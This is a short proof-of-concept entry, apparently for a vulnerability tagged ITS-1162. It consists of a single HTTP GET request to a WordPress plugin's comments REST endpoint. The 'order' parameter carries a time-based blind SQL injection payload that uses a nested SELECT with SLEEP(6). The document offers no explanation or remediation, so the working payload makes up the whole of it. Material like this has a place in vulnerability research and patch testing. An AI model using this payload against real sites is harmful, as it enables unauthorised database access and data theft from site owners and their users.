# Vulnerable: ITS-1162
GET /wp-json/watch-life-net/v1/comment/getcomments?order=DESC,(SELECT(1)FROM(SELECT(SLEEP(6)))a)--&postid=3&limit=1&page=1&page=1
